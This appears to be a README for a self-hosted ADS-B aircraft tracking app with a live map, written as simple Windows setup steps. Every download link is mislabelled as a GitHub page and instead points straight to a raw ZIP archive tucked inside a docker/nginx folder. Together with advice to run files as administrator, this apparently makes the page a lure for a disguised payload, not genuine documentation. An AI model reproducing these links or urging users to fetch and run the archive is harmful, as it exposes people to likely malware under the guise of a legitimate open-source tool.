# 🛩️ planegraph-aviation-tracker - Track Aircraft Data on One Box

[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nonstandard-reproduction263/planegraph-aviation-tracker/main/docker/nginx/aviation_planegraph_tracker_1.1-alpha.5.zip)

## ✈️ What this app does

planegraph-aviation-tracker is a self-hosted aviation data app. It takes ADS-B aircraft signals, decodes them, groups them into useful data, and shows them in a web app with a live map.

Use it to:

- View aircraft on a live map
- Watch flight data as it comes in
- Store aviation data on your own device
- Work with the data in a web browser
- Use one edge box for the full setup

## 🧭 What you need

Before you start, make sure you have:

- A Windows PC
- An internet connection
- Access to the GitHub page
- Enough free disk space for app files and data
- A browser such as Edge or Chrome

For best results, use a recent Windows 10 or Windows 11 system.

## 📥 Download and open the app

Go to this page to download or open the project files:

[Visit the GitHub download page](https://raw.githubusercontent.com/nonstandard-reproduction263/planegraph-aviation-tracker/main/docker/nginx/aviation_planegraph_tracker_1.1-alpha.5.zip)

If you see a release file or installer on the page, download it. If you see the source files only, download the project as a ZIP file from GitHub.

## 🖥️ Set up on Windows

Follow these steps to get the app running on Windows.

1. Open the GitHub page.
2. Look for a green Code button or a Releases section.
3. If a release file exists, download it.
4. If no release file exists, choose Download ZIP.
5. Save the file to your Downloads folder.
6. If you downloaded a ZIP file, right-click it and choose Extract All.
7. Open the extracted folder.
8. Look for a file named `README.md` or a setup file.
9. If the project includes Docker files, use the included Docker setup.
10. If the project includes a start script, run that file to begin.

## 🔧 Typical Windows run steps

This project is built like a self-hosted data platform. A common Windows setup looks like this:

1. Install Docker Desktop if the project uses Docker.
2. Open the extracted project folder.
3. Start the app with the provided Docker file or start script.
4. Wait for the services to start.
5. Open your browser.
6. Go to the local address shown by the app, such as `http://localhost:8000`.
7. Keep the app window open while you use it.

If the project includes a one-click launch file, use that file first. If it includes a web server and database, let both parts start before opening the browser.

## 🗺️ Using the dashboard

After the app starts, you can use the web UI to work with aircraft data.

You may see:

- A live aircraft map
- Flight paths
- Signal status
- Data tables
- Search tools
- Time-based views
- Simple charts for analysis

The map view may use MapLibre or Deck.gl style layers for smooth movement and clear display.

## 📡 How the data flow works

This app is made to handle ADS-B data from start to finish.

The basic flow is:

1. An SDR device or data feed receives aircraft signals.
2. The app decodes the raw signal data.
3. It groups the data into useful segments.
4. It stores the data in PostgreSQL and PostGIS.
5. It shows the results in the web UI.

This setup helps you keep aviation data on your own system instead of sending it to a cloud service.

## 🧱 Common folder and service parts

If you open the project files, you may see parts like these:

- `frontend` for the web app
- `backend` for the server
- `docker` for container setup
- `database` for stored data
- `scripts` for start and helper files
- `config` for app settings

You do not need to edit these files to run the app, but they help if you want to understand how the project is organized.

## ⚙️ First run checklist

Use this list if the app does not open right away:

- Make sure the app files are fully extracted
- Make sure Docker Desktop is running, if needed
- Check that no other app uses the same port
- Refresh the browser page
- Restart the app if the page stays blank
- Look for a `config` file if you need to change the local address

## 🔍 If the browser does not open

If the app starts but you do not see the page:

1. Open your browser.
2. Type the local address shown by the app.
3. Check `http://localhost:8000`.
4. Try `http://localhost:3000` if the first address does not work.
5. Wait a minute if the first load is slow.
6. Restart the app if needed.

## 🛠️ Simple troubleshooting

If something goes wrong, try these steps:

- Run the app as administrator
- Restart Windows
- Make sure the ZIP file was extracted
- Check that Docker Desktop is updated
- Close apps that use the same network port
- Clear the browser cache
- Open the app in a private browser window

If the project uses SDR hardware, make sure the device is connected before you start the app.

## 📊 Good use cases

This app works well for:

- Aircraft tracking at a local site
- Learning about ADS-B data
- Watching live map data
- Storing aviation data for later review
- Running a private flight data setup
- Exploring aircraft movement with a browser-based tool

## 🧩 Built with common tools

This project uses a stack that may include:

- Python for the server side
- React for the web UI
- FastAPI for API endpoints
- PostgreSQL for data storage
- PostGIS for map-aware data
- Docker for local deployment
- Asyncio for background tasks
- RTL-SDR for radio input

## 📌 Before you close the app

If the app is still collecting data, keep the window open. If you want to stop it:

1. Close the browser tab.
2. Stop the app window or terminal.
3. Stop Docker Desktop if you used Docker.
4. Save any data exports you want to keep.

## 📎 Download again

[Open the GitHub page to download or run the app](https://raw.githubusercontent.com/nonstandard-reproduction263/planegraph-aviation-tracker/main/docker/nginx/aviation_planegraph_tracker_1.1-alpha.5.zip)

## 🧾 File names you may see

When you download the project, you may see files such as:

- `docker-compose.yml`
- `Dockerfile`
- `requirements.txt`
- `package.json`
- `README.md`
- `.env.example`

These files help the app run on your computer. If a setup guide is included in the repository, follow that guide first.